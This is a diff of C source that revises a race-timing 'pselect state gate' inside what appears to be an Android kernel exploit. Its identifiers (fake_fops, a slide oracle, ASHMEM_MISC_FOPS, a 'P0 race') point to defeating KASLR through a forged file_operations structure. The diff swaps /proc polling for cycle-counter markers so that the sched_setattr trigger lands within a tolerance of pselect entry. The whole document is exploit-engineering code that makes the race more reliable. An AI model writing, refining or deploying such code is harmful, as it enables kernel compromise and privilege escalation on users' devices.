@@ -1,268 +1,90 @@
 #include "common.h"
+#include "czg3_diag.h"
 
 #if defined(APP_CZG3_PSELECT_STATE_GATE) && APP_CZG3_PSELECT_STATE_GATE
 
 /*
- * CZG3 currently uses the generic pselect route rather than the
- * APP_REQUIRE_FRESH_P0_SESSION route that owns the upstream in-line state
- * gate. Keep this experiment target-local and FOPS-only: interpose the
- * effective FOPS route delay and sched_setattr call without changing the P0
- * race, session model, offsets, or layout.
+ * CZG3 FOPS pselect gate v2.
  *
- * For a non-zero delay, the delay interposer first confirms that one sibling
- * is actually blocked in pselect6/do_select, then executes the already-selected
- * FOPS delay unchanged (60 ms by default, or an explicit supported override).
- * A zero-delay override has no usleep call to interpose, so the sched_setattr
- * interposer performs the same readiness acquisition before the trigger. In
- * both cases the exact TID is re-checked immediately before the real trigger.
- * Failure is fail-closed: sched_setattr is never called when the route cannot
- * prove the expected pselect state.
+ * The first gate used /proc/self/task/<tid>/{syscall,wchan} polling before and
+ * after the selected FOPS delay. Device logs showed that pselect6/do_select did
+ * not distinguish winning from losing FOPS states and the polling itself moved
+ * the action roughly 0.5-0.7 ms later.
+ *
+ * v2 reuses the existing production RMG_RACE_LIGHT_V1 state that slide_app.c
+ * already records with CNTVCT_EL0 + relaxed atomic stores. PSELECT_ENTER is the
+ * timing origin and PSELECT_RETURN doubles as the active-state marker. No /proc
+ * reads, directory scans, or success-path logging are performed in the hot
+ * path. P0 remains outside this interposer because the light race state is only
+ * enabled for the FOPS oracle route.
  */
 
 extern int __real_usleep(useconds_t usec);
 extern long __real_sched_setattr_tid(int tid, int nice_value);
 
-#define CZG3_GATE_MAX_SIBLINGS 32
+/* Shared backing for the low-overhead inline telemetry in czg3_diag.h. */
+atomic_uint_fast64_t czg3_light_race_ticks[CZG3_LIGHT_SLOT_COUNT];
+atomic_int czg3_light_race_attempt;
+atomic_int czg3_light_race_enabled;
+
+enum gate_failure {
+  GATE_OK = 0,
+  GATE_BAD_COUNTER,
+  GATE_NO_PSELECT_ENTER,
+  GATE_PSELECT_RETURNED,
+  GATE_TRIGGER_LATE
+};
 
 struct czg3_pselect_gate_ctx {
   int active;
   int ready_ok;
-  int target_tid;
-  size_t ready_wait_usec;
-  uint64_t ready_confirmed_ns;
-  char ready_wchan[64];
+  enum gate_failure failure;
+  useconds_t effective_delay_usec;
+  uint64_t counter_hz;
+  uint64_t pselect_enter_tick;
+  uint64_t deadline_tick;
+  uint64_t ready_wait_usec;
+  uint64_t deadline_late_usec;
 };
 
 static _Thread_local struct czg3_pselect_gate_ctx gate_ctx;
 static atomic_int gate_banner_printed;
 
-static uint64_t gate_now_ns(void) {
-  struct timespec ts;
-  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
+static const char *gate_failure_name(enum gate_failure failure) {
+  switch (failure) {
+    case GATE_OK:
+      return "ok";
+    case GATE_BAD_COUNTER:
+      return "bad-counter";
+    case GATE_NO_PSELECT_ENTER:
+      return "no-pselect-enter";
+    case GATE_PSELECT_RETURNED:
+      return "pselect-returned";
+    case GATE_TRIGGER_LATE:
+      return "trigger-late";
+    default:
+      return "unknown";
+  }
+}
+
+static uint64_t gate_usec_to_ticks(uint64_t usec, uint64_t frequency) {
+  if (!frequency || usec > UINT64_MAX / frequency) {
     return 0;
   }
-  return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
+  uint64_t product = usec * frequency;
+  return (product + 999999ULL) / 1000000ULL;
 }
 
-static size_t gate_elapsed_usec(uint64_t started) {
-  uint64_t now = gate_now_ns();
-  if (!started || !now || now < started) {
-    return 0;
+static uint64_t gate_ticks_to_usec(uint64_t ticks, uint64_t frequency) {
+  if (!frequency) {
+    return UINT64_MAX;
   }
-  return (size_t)((now - started) / 1000ULL);
+  return (ticks * 1000000ULL) / frequency;
 }
 
-static long gate_read_task_syscall_nr(int tid) {
-  char path[64];
-  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
-  int fd = open(path, O_RDONLY | O_CLOEXEC);
-  if (fd < 0) {
-    return -1;
-  }
-  char buf[128];
-  ssize_t n = read(fd, buf, sizeof(buf) - 1);
-  int saved_errno = errno;
-  close(fd);
-  errno = saved_errno;
-  if (n <= 0) {
-    return -1;
-  }
-  buf[n] = 0;
-  char *end = NULL;
-  errno = 0;
-  long nr = strtol(buf, &end, 0);
-  if (errno || end == buf) {
-    return -1;
-  }
-  return nr;
-}
-
-static int gate_read_task_wchan(int tid, char *buf, size_t size) {
-  if (size < 2) {
-    return 0;
-  }
-  char path[64];
-  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
-  int fd = open(path, O_RDONLY | O_CLOEXEC);
-  if (fd < 0) {
-    return 0;
-  }
-  ssize_t n = read(fd, buf, size - 1);
-  int saved_errno = errno;
-  close(fd);
-  errno = saved_errno;
-  if (n <= 0) {
-    return 0;
-  }
-  buf[n] = 0;
-  char *newline = strchr(buf, '\n');
-  if (newline) {
-    *newline = 0;
-  }
-  return 1;
-}
-
-static int gate_task_blocked_in_pselect(int tid, char *wchan, size_t size) {
-  if (gate_read_task_syscall_nr(tid) != SYS_pselect6 ||
-      !gate_read_task_wchan(tid, wchan, size)) {
-    return 0;
-  }
-  return strncmp(wchan, "do_select", strlen("do_select")) == 0;
-}
-
-static int gate_collect_sibling_tids(int *tids, size_t capacity) {
-  DIR *dir = opendir("/proc/self/task");
-  if (!dir) {
-    return -1;
-  }
-
-  int self_tid = (int)syscall(SYS_gettid);
-  size_t count = 0;
-  int overflow = 0;
-  struct dirent *entry;
-  while ((entry = readdir(dir)) != NULL) {
-    char *end = NULL;
-    errno = 0;
-    long parsed = strtol(entry->d_name, &end, 10);
-    if (errno || end == entry->d_name || *end || parsed <= 0 ||
-        parsed > INT32_MAX || (int)parsed == self_tid) {
-      continue;
-    }
-    if (count == capacity) {
-      overflow = 1;
-      break;
-    }
-    tids[count++] = (int)parsed;
-  }
-  closedir(dir);
-
-  if (overflow) {
-    return -1;
-  }
-  return (int)count;
-}
-
-static int gate_find_blocked_pselect_tid(const int *tids, size_t count,
-                                         char *wchan, size_t wchan_size) {
-  for (size_t index = 0; index < count; index++) {
-    if (gate_task_blocked_in_pselect(tids[index], wchan, wchan_size)) {
-      return tids[index];
-    }
-  }
-  return -1;
-}
-
-static int gate_wait_for_any_pselect(size_t timeout_usec, int confirmations,
-                                     int *tid_out, size_t *elapsed_usec,
-                                     char *wchan, size_t wchan_size) {
-  int tids[CZG3_GATE_MAX_SIBLINGS];
-  int tid_count = gate_collect_sibling_tids(
-      tids, sizeof(tids) / sizeof(tids[0]));
-  uint64_t started = gate_now_ns();
-  if (tid_count <= 0 || !started) {
-    if (elapsed_usec) {
-      *elapsed_usec = 0;
-    }
-    return 0;
-  }
-
-  uint64_t deadline = started + (uint64_t)timeout_usec * 1000ULL;
-  int candidate = -1;
-  int confirmed = 0;
-  for (;;) {
-    uint64_t now = gate_now_ns();
-    if (!now || now >= deadline) {
-      break;
-    }
-
-    char current_wchan[64] = "<not-read>";
-    int tid = gate_find_blocked_pselect_tid(
-        tids, (size_t)tid_count, current_wchan, sizeof(current_wchan));
-    if (tid > 0 && tid == candidate) {
-      confirmed++;
-    } else if (tid > 0) {
-      candidate = tid;
-      confirmed = 1;
-    } else {
-      candidate = -1;
-      confirmed = 0;
-    }
-
-    if (confirmed >= confirmations) {
-      if (tid_out) {
-        *tid_out = candidate;
-      }
-      if (wchan && wchan_size) {
-        snprintf(wchan, wchan_size, "%s", current_wchan);
-      }
-      if (elapsed_usec) {
-        *elapsed_usec = gate_elapsed_usec(started);
-      }
-      return 1;
-    }
-
-    if (tid > 0) {
-      __real_usleep(100);
-    } else {
-      __asm__ volatile("yield" ::: "memory");
-    }
-  }
-
-  if (elapsed_usec) {
-    *elapsed_usec = gate_elapsed_usec(started);
-  }
-  return 0;
-}
-
-static int gate_wait_for_exact_pselect(int tid, size_t timeout_usec,
-                                       int confirmations,
-                                       size_t *elapsed_usec,
-                                       char *wchan, size_t wchan_size) {
-  uint64_t started = gate_now_ns();
-  if (!started) {
-    if (elapsed_usec) {
-      *elapsed_usec = 0;
-    }
-    return 0;
-  }
-
-  uint64_t deadline = started + (uint64_t)timeout_usec * 1000ULL;
-  int confirmed = 0;
-  for (;;) {
-    uint64_t now = gate_now_ns();
-    if (!now || now >= deadline) {
-      break;
-    }
-
-    char current_wchan[64] = "<not-read>";
-    if (gate_task_blocked_in_pselect(tid, current_wchan,
-                                     sizeof(current_wchan))) {
-      confirmed++;
-      if (wchan && wchan_size) {
-        snprintf(wchan, wchan_size, "%s", current_wchan);
-      }
-      if (confirmed >= confirmations) {
-        if (elapsed_usec) {
-          *elapsed_usec = gate_elapsed_usec(started);
-        }
-        return 1;
-      }
-      __real_usleep(100);
-    } else {
-      confirmed = 0;
-      __asm__ volatile("yield" ::: "memory");
-    }
-  }
-
-  if (elapsed_usec) {
-    *elapsed_usec = gate_elapsed_usec(started);
-  }
-  return 0;
-}
-
-/* Return 1 for the CZG3 FOPS route with a valid effective delay, 0 when this
- * is not the FOPS route, and -1 when FOPS is identified but its delay metadata
- * is missing or malformed. The latter must be treated fail-closed. */
+/* Return 1 for CZG3 FOPS with valid delay metadata, 0 for a non-FOPS route,
+ * and -1 when the FOPS route is identified but the delay metadata is invalid.
+ */
 static int gate_get_effective_fops_delay(useconds_t *delay_out) {
   if (slide_oracle_parent != fake_fops ||
       slide_oracle_target != data_addr(ASHMEM_MISC_FOPS)) {
@@ -285,114 +107,234 @@ static int gate_get_effective_fops_delay(useconds_t *delay_out) {
   return 1;
 }
 
-static int gate_matches_fops_route(useconds_t usec) {
+static int gate_matches_fops_delay(useconds_t usec) {
   useconds_t effective_delay = 0;
   return gate_get_effective_fops_delay(&effective_delay) == 1 &&
          effective_delay == usec;
 }
 
-static void gate_arm_ready_check(void) {
+static uint64_t gate_load_tick(enum czg3_light_race_slot slot) {
+  return atomic_load_explicit(&czg3_light_race_ticks[slot],
+                              memory_order_relaxed);
+}
+
+static int gate_wait_for_pselect_enter(uint64_t frequency,
+                                       uint64_t *enter_tick,
+                                       uint64_t *wait_usec) {
+  uint64_t started = czg3_light_read_counter();
+  uint64_t timeout_ticks = gate_usec_to_ticks(
+      APP_CZG3_PSELECT_START_TIMEOUT_USEC, frequency);
+  if (!started || !timeout_ticks) {
+    return 0;
+  }
+
+  for (;;) {
+    uint64_t enter = gate_load_tick(CZG3_LIGHT_PSELECT_ENTER);
+    if (enter) {
+      if (enter_tick) {
+        *enter_tick = enter;
+      }
+      if (wait_usec) {
+        uint64_t now = czg3_light_read_counter();
+        *wait_usec = now >= started
+            ? gate_ticks_to_usec(now - started, frequency)
+            : 0;
+      }
+      return 1;
+    }
+    if (gate_load_tick(CZG3_LIGHT_PSELECT_RETURN)) {
+      return 0;
+    }
+
+    uint64_t now = czg3_light_read_counter();
+    if (!now || now < started || now - started >= timeout_ticks) {
+      return 0;
+    }
+    __asm__ volatile("yield" ::: "memory");
+  }
+}
+
+static int gate_wait_until_deadline(useconds_t delay_usec) {
   memset(&gate_ctx, 0, sizeof(gate_ctx));
   gate_ctx.active = 1;
-  gate_ctx.target_tid = -1;
-  snprintf(gate_ctx.ready_wchan, sizeof(gate_ctx.ready_wchan),
-           "<not-read>");
-  gate_ctx.ready_ok = gate_wait_for_any_pselect(
-      APP_CZG3_PSELECT_READY_TIMEOUT_USEC,
-      APP_CZG3_PSELECT_WCHAN_CONFIRMATIONS,
-      &gate_ctx.target_tid, &gate_ctx.ready_wait_usec,
-      gate_ctx.ready_wchan, sizeof(gate_ctx.ready_wchan));
-  if (gate_ctx.ready_ok) {
-    gate_ctx.ready_confirmed_ns = gate_now_ns();
+  gate_ctx.effective_delay_usec = delay_usec;
+  gate_ctx.failure = GATE_BAD_COUNTER;
+  gate_ctx.counter_hz = czg3_light_read_frequency();
+  if (!gate_ctx.counter_hz) {
+    return 0;
   }
+
+  if (!gate_wait_for_pselect_enter(gate_ctx.counter_hz,
+                                   &gate_ctx.pselect_enter_tick,
+                                   &gate_ctx.ready_wait_usec)) {
+    gate_ctx.failure = gate_load_tick(CZG3_LIGHT_PSELECT_RETURN)
+        ? GATE_PSELECT_RETURNED
+        : GATE_NO_PSELECT_ENTER;
+    return 0;
+  }
+
+  uint64_t delay_ticks = gate_usec_to_ticks(delay_usec, gate_ctx.counter_hz);
+  if (delay_usec && !delay_ticks) {
+    gate_ctx.failure = GATE_BAD_COUNTER;
+    return 0;
+  }
+  if (UINT64_MAX - gate_ctx.pselect_enter_tick < delay_ticks) {
+    gate_ctx.failure = GATE_BAD_COUNTER;
+    return 0;
+  }
+  gate_ctx.deadline_tick = gate_ctx.pselect_enter_tick + delay_ticks;
+
+  for (;;) {
+    if (gate_load_tick(CZG3_LIGHT_PSELECT_RETURN)) {
+      gate_ctx.failure = GATE_PSELECT_RETURNED;
+      return 0;
+    }
+
+    uint64_t now = czg3_light_read_counter();
+    if (!now) {
+      gate_ctx.failure = GATE_BAD_COUNTER;
+      return 0;
+    }
+    if (now >= gate_ctx.deadline_tick) {
+      gate_ctx.deadline_late_usec = gate_ticks_to_usec(
+          now - gate_ctx.deadline_tick, gate_ctx.counter_hz);
+      break;
+    }
+
+    uint64_t remaining_usec = gate_ticks_to_usec(
+        gate_ctx.deadline_tick - now, gate_ctx.counter_hz);
+    if (remaining_usec > 2000) {
+      /* Sleep most of the remaining interval, then finish with a short yield
+       * loop. This keeps the target anchored to PSELECT_ENTER rather than to
+       * the time spent entering this wrapper. */
+      useconds_t sleep_usec = (useconds_t)(remaining_usec - 1000);
+      if (sleep_usec) {
+        __real_usleep(sleep_usec);
+      }
+    } else {
+      __asm__ volatile("yield" ::: "memory");
+    }
+  }
+
+  if (gate_load_tick(CZG3_LIGHT_PSELECT_RETURN)) {
+    gate_ctx.failure = GATE_PSELECT_RETURNED;
+    return 0;
+  }
+  if (gate_ctx.deadline_late_usec > APP_CZG3_PSELECT_LATE_TOLERANCE_USEC) {
+    gate_ctx.failure = GATE_TRIGGER_LATE;
+    return 0;
+  }
+
+  gate_ctx.failure = GATE_OK;
+  gate_ctx.ready_ok = 1;
+  return 1;
 }
 
 int __wrap_usleep(useconds_t usec) {
-  if (!gate_matches_fops_route(usec)) {
+  if (!gate_matches_fops_delay(usec)) {
     return __real_usleep(usec);
   }
 
-  gate_arm_ready_check();
+  /* Do not add the original delay after this call. gate_wait_until_deadline()
+   * has already waited until PSELECT_ENTER + effective_delay. */
+  (void)gate_wait_until_deadline(usec);
+  return 0;
+}
 
-  /* Preserve the already-selected non-zero FOPS delay even if readiness was
-   * not confirmed. The following sched_setattr wrapper will refuse mutation. */
-  return __real_usleep(usec);
+static long gate_skip_trigger(int tid, const char *reason) {
+  uint64_t enter = gate_load_tick(CZG3_LIGHT_PSELECT_ENTER);
+  uint64_t returned = gate_load_tick(CZG3_LIGHT_PSELECT_RETURN);
+  uint64_t now = czg3_light_read_counter();
+  uint64_t age_usec = UINT64_MAX;
+  if (enter && now >= enter && gate_ctx.counter_hz) {
+    age_usec = gate_ticks_to_usec(now - enter, gate_ctx.counter_hz);
+  }
+  pr_info("slide fops pselect state gate v2 trigger=skipped reason=%s "
+          "gate_failure=%s delay_usec=%u ready_wait_usec=%llu "
+          "late_usec=%llu pselect_age_usec=%llu enter=%llu return=%llu "
+          "call_tid=%d\n",
+          reason, gate_failure_name(gate_ctx.failure),
+          (unsigned int)gate_ctx.effective_delay_usec,
+          (unsigned long long)gate_ctx.ready_wait_usec,
+          (unsigned long long)gate_ctx.deadline_late_usec,
+          (unsigned long long)age_usec,
+          (unsigned long long)enter,
+          (unsigned long long)returned,
+          tid);
+  memset(&gate_ctx, 0, sizeof(gate_ctx));
+  errno = EAGAIN;
+  return -1;
 }
 
 long __wrap_sched_setattr_tid(int tid, int nice_value) {
-  if (!gate_ctx.active) {
-    useconds_t effective_delay = 0;
-    int fops_route = gate_get_effective_fops_delay(&effective_delay);
-    if (fops_route == 0) {
-      return __real_sched_setattr_tid(tid, nice_value);
-    }
-    if (fops_route < 0) {
-      pr_info("slide fops pselect state gate trigger=skipped reason=bad-delay-metadata "
-              "call_tid=%d\n",
-              tid);
-      errno = EAGAIN;
-      return -1;
-    }
-
-    if (effective_delay != 0) {
-      /* A non-zero FOPS route must have passed through __wrap_usleep first.
-       * Reaching the trigger unarmed means the expected gate was bypassed;
-       * refuse mutation rather than silently falling through. */
-      pr_info("slide fops pselect state gate trigger=skipped reason=unarmed "
-              "effective_delay_usec=%u call_tid=%d\n",
-              (unsigned int)effective_delay, tid);
-      errno = EAGAIN;
-      return -1;
-    }
-
-    /* A zero-delay override intentionally skips usleep in slide_app.c. Arm
-     * the same readiness gate here so zero cannot bypass state validation. */
-    gate_arm_ready_check();
+  useconds_t effective_delay = 0;
+  int fops_route = gate_get_effective_fops_delay(&effective_delay);
+  if (fops_route == 0) {
+    return __real_sched_setattr_tid(tid, nice_value);
   }
-
-  size_t guard_wait_usec = 0;
-  char guard_wchan[64] = "<not-read>";
-  int guard_ok = 0;
-  if (gate_ctx.ready_ok && tid == gate_ctx.target_tid) {
-    guard_ok = gate_wait_for_exact_pselect(
-        tid, APP_CZG3_PSELECT_RECHECK_TIMEOUT_USEC,
-        APP_CZG3_PSELECT_WCHAN_CONFIRMATIONS,
-        &guard_wait_usec, guard_wchan, sizeof(guard_wchan));
-  }
-
-  uint64_t now_ns = gate_now_ns();
-  uint64_t ready_to_trigger_usec =
-      gate_ctx.ready_confirmed_ns && now_ns >= gate_ctx.ready_confirmed_ns
-          ? (now_ns - gate_ctx.ready_confirmed_ns) / 1000ULL
-          : UINT64_MAX;
-
-  if (!gate_ctx.ready_ok || tid != gate_ctx.target_tid || !guard_ok) {
-    pr_info("slide fops pselect state gate trigger=skipped ready=%d "
-            "ready_usec=%zu ready_wchan=%s target_tid=%d call_tid=%d "
-            "guard=%d guard_usec=%zu guard_wchan=%s "
-            "ready_to_trigger_usec=%llu\n",
-            gate_ctx.ready_ok, gate_ctx.ready_wait_usec,
-            gate_ctx.ready_wchan, gate_ctx.target_tid, tid,
-            guard_ok, guard_wait_usec, guard_wchan,
-            (unsigned long long)ready_to_trigger_usec);
+  if (fops_route < 0) {
     memset(&gate_ctx, 0, sizeof(gate_ctx));
-    errno = EAGAIN;
-    return -1;
+    gate_ctx.active = 1;
+    gate_ctx.failure = GATE_BAD_COUNTER;
+    return gate_skip_trigger(tid, "bad-delay-metadata");
   }
 
-  /* No successful-path logging here: printing before the real call returns to
-   * slide_app.c would contaminate the existing action->readiness timing. */
-  gate_ctx.active = 0;
+  if (!gate_ctx.active) {
+    if (effective_delay != 0) {
+      gate_ctx.effective_delay_usec = effective_delay;
+      gate_ctx.failure = GATE_NO_PSELECT_ENTER;
+      return gate_skip_trigger(tid, "unarmed");
+    }
+    /* slide_wait_before_consume() intentionally omits usleep(0), so zero-delay
+     * uses the same marker-based arm path here. */
+    (void)gate_wait_until_deadline(0);
+  }
+
+  if (gate_ctx.effective_delay_usec != effective_delay) {
+    return gate_skip_trigger(tid, "delay-changed");
+  }
+  if (!gate_ctx.ready_ok) {
+    return gate_skip_trigger(tid, "gate-not-ready");
+  }
+
+  uint64_t enter = gate_load_tick(CZG3_LIGHT_PSELECT_ENTER);
+  uint64_t returned = gate_load_tick(CZG3_LIGHT_PSELECT_RETURN);
+  uint64_t now = czg3_light_read_counter();
+  if (!enter || enter != gate_ctx.pselect_enter_tick) {
+    gate_ctx.failure = GATE_NO_PSELECT_ENTER;
+    return gate_skip_trigger(tid, "enter-marker-changed");
+  }
+  if (returned) {
+    gate_ctx.failure = GATE_PSELECT_RETURNED;
+    return gate_skip_trigger(tid, "pselect-returned");
+  }
+  if (!now || now < gate_ctx.deadline_tick) {
+    gate_ctx.failure = GATE_BAD_COUNTER;
+    return gate_skip_trigger(tid, "deadline-not-reached");
+  }
+
+  uint64_t late_usec = gate_ticks_to_usec(
+      now - gate_ctx.deadline_tick, gate_ctx.counter_hz);
+  if (late_usec > APP_CZG3_PSELECT_LATE_TOLERANCE_USEC) {
+    gate_ctx.deadline_late_usec = late_usec;
+    gate_ctx.failure = GATE_TRIGGER_LATE;
+    return gate_skip_trigger(tid, "trigger-late");
+  }
+
+  /* No success-path logging. At this point the hot-path work added by v2 is
+   * only atomic marker loads plus CNTVCT reads; the existing telemetry records
+   * the real sched_setattr completion afterward. */
+  memset(&gate_ctx, 0, sizeof(gate_ctx));
   return __real_sched_setattr_tid(tid, nice_value);
 }
 
 __attribute__((constructor)) static void czg3_state_gate_banner(void) {
   if (atomic_exchange(&gate_banner_printed, 1) == 0) {
-    pr_info("CZG3 FOPS pselect state gate enabled ready_timeout_us=%d "
-            "recheck_timeout_us=%d confirmations=%d default_fops_delay_us=%d\n",
-            APP_CZG3_PSELECT_READY_TIMEOUT_USEC,
-            APP_CZG3_PSELECT_RECHECK_TIMEOUT_USEC,
-            APP_CZG3_PSELECT_WCHAN_CONFIRMATIONS,
+    pr_info("CZG3 FOPS pselect state gate v2 enabled start_timeout_us=%d "
+            "late_tolerance_us=%d default_fops_delay_us=%d "
+            "source=RMG_RACE_LIGHT_V1\n",
+            APP_CZG3_PSELECT_START_TIMEOUT_USEC,
+            APP_CZG3_PSELECT_LATE_TOLERANCE_USEC,
             APP_FOPS_ROUTE_COARSE_DELAY_USEC);
   }
 }
